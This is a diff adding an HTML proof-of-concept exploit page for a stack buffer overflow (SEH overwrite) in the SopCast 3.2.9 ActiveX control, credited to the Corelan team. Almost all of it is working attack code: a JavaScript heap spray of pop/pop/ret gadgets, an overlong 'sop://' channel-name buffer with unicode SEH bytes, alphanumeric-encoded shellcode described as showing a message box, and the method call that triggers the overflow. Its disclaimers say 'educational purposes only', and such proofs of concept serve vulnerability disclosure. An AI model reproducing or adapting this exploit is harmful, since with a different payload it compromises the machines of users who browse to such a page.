@@ -1,0 +1,118 @@
+<html>
+<Center>
+<H1>Sopcast POC by Sud0<br></H1>
+<b>Tested on XP SP3 EN on VBox with IE 7<br>
+Spraying a lot to get a nice unicode usable address 0x20260078<br>
+I sprayed with a set of P/P/R instructions to come back to the stack<br>
+***Need internet connection on the box to trigger the vuln***<br>
+Wait for the Spray to finish (IE will seem freezed for some seconds)<br>
+The Sopcast control will be loaded and shown on the page<br>
+wait approx 3 to 5 seconds and a message box should appear<br>
+</b>
+</Center>
+<!--
+# Exploit Title : SopCast BOF
+# Date          : August 10, 2010
+# Author        : Sud0
+# Bug found by  : Sud0
+# Software Link : http://www.sopcast.com - http://www.easetuner.com
+# Version       : 3.2.9
+# OS            : Windows
+# Tested on     : XP SP3 En (VirtualBox) Fully Patched, Internet Explorer 7
+# Type of vuln  : Stack Buffer Overflow - SEH
+# Advisory      : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-059
+# Big thanks to : my wife for supporting me
+# Greetz to     : Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+ 
+
+|------------------------------------------------------------------|
+|                         __               __                      |
+|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+|                                                                  |
+|                                       http://www.corelan.be:8800 |
+|                                              security@corelan.be |
+|                                                                  |
+|-------------------------------------------------[ EIP Hunters ]--|
+
+ Script provided 'as is', without any warranty.
+ Use for educational purposes only.
+ Do not use this code to do anything illegal !
+ Corelan does not want anyone to use this script
+ for malicious and/or illegal purposes
+ Corelan cannot be held responsible for any illegal use.
+
+ Note : you are not allowed to edit/modify this code.  
+ If you do, Corelan cannot be held responsible for any damages this may cause.
+
+
+
+-->
+
+<object classid='clsid:8FEFF364-6A5F-4966-A917-A3AC28411659' id='boom' ></object>
+<script>
+// ######################################### Begin of spraying with (nops + Pop/Pop/Ret) instructions to come back to the stack
+
+var nops = unescape("%49%41");  // some nice nops on ECX
+var ppr = unescape("%49%58%49%58%49%c3");  // Pop EAX / pop EAX / Ret
+var ppraddy = 0x20260078;
+var BlockSize = 0x200000; 
+var BlockHeaderSize = 0x26; 
+var PPRSize = 0x6;
+var nopSize = BlockSize - (PPRSize + BlockHeaderSize); 
+var heapBlocks = (ppraddy+BlockSize*2)/(BlockSize*2); 
+var Spray = new Array(); 
+  while (nops.length<nopSize) 
+	{
+	nops += nops; 
+	}
+nops = nops.substring(0,nopSize);
+  for (i=0;i<heapBlocks;i++) 
+   { 
+    Spray[i] = nops +  ppr; 
+   } 
+// ######################################### end of spraying
+
+      var buffSize = 522;   // (516 + 6 = sop:// )offset to overwrite EIP
+      var x="sop://";
+	while (x.length<buffSize) x += unescape("%41");
+	x+=unescape("%41");
+	x+=unescape("%41");
+	x+=unescape("%87");  //low unicode bytes of seh destination address 0035 (0x20260087)
+	x+="?";  //High unicode bytes of seh destination address 2026 (0x20260087)
+	x+=unescape("%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49");
+      x+=unescape("%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A");
+      x+=unescape("%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49");
+      x+=unescape("%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%5A%49%52%49%c3");
+
+// some junk before shellcode
+for (i=0;i<330;i++) 
+   { 
+    x+=unescape("%41");
+   } 
+
+// messagebox shellcode
+x+="RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIA";
+x+="IQI111AIAJQYAZBABABABABkMAGB9u4JBfyjK3kXYRTLdKDNQyBx2pzlqGYS4DKPqlpBkQfzl2kpvMLTKq6LH4KqnmP";
+x+="TKMfNXNoLXrUL3Ny9qXQKOYQc0bkplo4nDrk15oLTKPTKUD8KQXj2kMzlX4K1JkpyqjK7sp7OY4KMdtKKQZNLqIomaw";
+x+="PilVLRdWPBTlJ6a6olMJawWHil1YoKOKOmk3LKtMXSEgnRkojO4YqZK0fBkzlpKRkqJKlm1JKdKitRkkQxhe9oTLdML";
+x+="31es6RKXKywdsY9UCYfbOx2npNZnzLpR8h5LkOKOkOQyQ5kT5kSNj8yRBSSWmLo4nrxhdKKOKOKOe9oUkXoxRLplMPK";
+x+="O1XLsnRnNs41Xaet3REbRQx1LmTkZSYK6pVKOPULDqyWRPPWKSxg2Nm5lQwklktPRYXqN9okOYo38PlaQPnQH2HPCrO";
+x+="2RqUNQ9KrhqLMTlG1yGsQXnPpXkpKp1XKpNs45s4OxQTmPOrQiQXpoOysDouQXMucHRPPllqWYrhPLktKaQy7qNQ6rN";
+x+="rpSpQqBkOvpNQgPB0ioNuyxkZA";
+
+// some junk after shellcode
+for (i=0;i<40000;i++) 
+   { 
+    x+=unescape("%41");
+   } 
+
+// calling the boom
+    boom.ChannelName=x; // setting channel name
+    boom.SetSopAddress(x); // getting address to trigger the boom
+
+</script>
+</html>
